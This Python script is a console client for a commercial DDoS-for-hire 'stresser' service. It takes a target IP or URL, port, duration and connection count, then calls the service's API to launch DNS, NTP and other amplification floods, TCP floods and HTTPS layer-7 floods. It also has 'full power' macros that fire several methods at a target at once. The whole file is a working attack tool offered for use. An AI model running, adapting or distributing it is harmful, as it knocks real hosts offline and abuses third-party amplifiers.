# -*- coding: utf-8 -*-
from httpx import get
from os import system,_exit
from sys import stdout
from time import sleep
from sty import fg

_USERNAME="larina"

_KEY="KEY_HERE" # key from here >> https://stresser.us/

# https://stresser.us/documentation
_GEO="TH" # geolocation for tcp tfo
_SUBNET="true" # subnet mode for amp method
_DALAY=0.5 # wait delay per req
_METHODS=["DNS","NTP","WSD","DVR","ARD", "TCPMB" ,"HTTPSv3","HTTPSv2","HTTPSv1"]
_MACRO={ # full power
    "MAXTCP":["TCPMB"],
    "MAXUDP":["DNS", "NTP", "WSD", "DVR", "ARD"],
    "MAXHTTPS":["HTTPSv1", "HTTPSv2", "HTTPSv3"]
}

__builtins__.print = lambda text="",end="\r\n": stdout.write(f"{text}{end}");stdout.flush()
clearconsole = lambda:system("cls || clear")
exit=lambda: _exit(0)

class _COLOR():# https://i.stack.imgur.com/S8wtO.png
    text   = 15
    invite = 82
    logo   = 117
    line   = 225

def makec(text,color):
    return f"{fg(color)}{text}{fg.rs}"

def printc(text):
    for l in text.splitlines():
        print(f"\t\t     {l}")

def logo():
    clearconsole()
    printc(makec("""\t         ▄                                                                    
\t ▄▄▄▄  ▄██▄  ▄▄▄ ▄▄    ▄▄▄▄   ▄▄▄▄   ▄▄▄▄    ▄▄▄▄  ▄▄▄ ▄▄     ▄▄▄ ▄▄▄   ▄▄▄▄  
\t██▄ ▀   ██    ██▀ ▀▀ ▄█▄▄▄██ ██▄ ▀  ██▄ ▀  ▄█▄▄▄██  ██▀ ▀▀     ██  ██  ██▄ ▀  
\t▄ ▀█▄▄  ██    ██     ██      ▄ ▀█▄▄ ▄ ▀█▄▄ ██       ██         ██  ██  ▄ ▀█▄▄ 
\t█▀▄▄█▀  ▀█▄▀ ▄██▄     ▀█▄▄▄▀ █▀▄▄█▀ █▀▄▄█▀  ▀█▄▄▄▀ ▄██▄        ▀█▄▄▀█▄ █▀▄▄█▀ """,_COLOR.logo))
    printc(makec("\t\t\tt.me/stresseruschat and stresser.us\n",_COLOR.invite))

def realint(s):
    try:return int(s)
    except:return -1

def isgoodipv4(s)->bool:
    pieces = s.split('.')
    if len(pieces) != 4: return False
    try: return all(0<=int(p)<256 for p in pieces)
    except ValueError: return False

def isgoodint(p,max)->bool:
    p=realint(p)
    if p <= max and not (p <= 0): return True
    return False

def request(ip,port,time,conn,method):
    for _ in range(int(conn)):
        try:
            resp=get(f"https://darlingapi.com/?key={_KEY}&host={ip}&port={port}&time={time}&method={method}&geolocation={_GEO}&subnet={_SUBNET}",timeout=20,headers={"User-Agent": "PYTHON.HTTPX/0.1 github.com/Larinax999/stresser.us-api"}).json()
            print(makec(f"[{method}] "+resp.get("message",resp.get("data")),46 if resp["status"] == "success" else 9))
        except Exception as e:
            try:
                print(resp)
                print(resp.text)
            except:pass
            print(e)
            print(makec("[!] idk error. api down?",9))
        sleep(_DALAY)  

def helpcom():
    logo()
    # \t\t {makec("║",_COLOR.line)} {makec("BOTNET",206)}  ║ {makec("> TCPBOT, SYNBOT, UDPBOT, UDPSBOT, OVHBOT",_COLOR.text)}        {makec("║",_COLOR.line)}
    # \t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IPRAND",_COLOR.text)}                                         {makec("║",_COLOR.line)}
    # \t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPRAW, UDPPPS",_COLOR.text)}                                 {makec("║",_COLOR.line)}
    # \t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP",_COLOR.text)}     
    printc(f"""\t\t {makec("╔═════════╦══════════════════════════════════════════════════╗",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> DNS, NTP, WSD, DVR, ARD",_COLOR.text)}                        {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPMB",_COLOR.text)}                                          {makec("║",_COLOR.line)}
\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> HTTPSv1, HTTPSv2, HTTPSv3",_COLOR.text)}                      {makec("║",_COLOR.line)}
\t\t {makec("╚═════════╩══════════════════════════════════════════════════╝",_COLOR.line)}""")

def clearcom():
    logo()
    print("")


def main():
    global _GEO
    # print("\n"*12)
    # stdout.write("".center(50))
    # for cha in "welcome back, larina.":
    #     stdout.write(cha)
    #     stdout.flush()
    #     sleep(0.1)
    # sleep(2)
    helpcom()
    while 1:
        rawcommands=input(f'{makec(f"{_USERNAME}@us",196)}{makec(":~$",_COLOR.text)}{fg(81)} ').split(" ")
        commands=rawcommands[0].upper()
        args=rawcommands[1:]
        # print(commands,_MACRO.get(commands,False))
        if commands in _METHODS or _MACRO.get(commands,False):
            if (len(args) < 4) or (not ((commands.startswith("HTTPS") or commands.startswith("BROWSER")) or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10))):
                print(makec(f"[*] {commands} <ip/url> <port> <time> <conn>",99))
            else: 
                if _MACRO.get(commands,False):
                    for method in _MACRO[commands]:
                        request(args[0],args[1],args[2],args[3],method)
                    continue
                request(args[0],args[1],args[2],args[3],commands)
        elif commands == "SET":
            if len(args) < 2:
                print(makec(f"[*] set <value_name> <value>",99))
                continue
            if args[0] == "geo":
                _GEO=args[1]
                print(makec(f"[*] SET `{args[0]}` TO `{args[1]}`",_COLOR.invite))
        else:   
            try:
                commandslist[commands]()
            except:print(makec("[!] command not found",11))

if __name__ == "__main__":
    commandslist={"EXIT":exit,"QUIT":exit,"HELP":helpcom,"CLEAR":helpcom,"CLS":helpcom} # clearcom
    system("CHCP 65001 || clear") # set utf 8
    system("mode 130,30 || clear")
    system("title stresser us panel private ^<3 || clear")
    main()
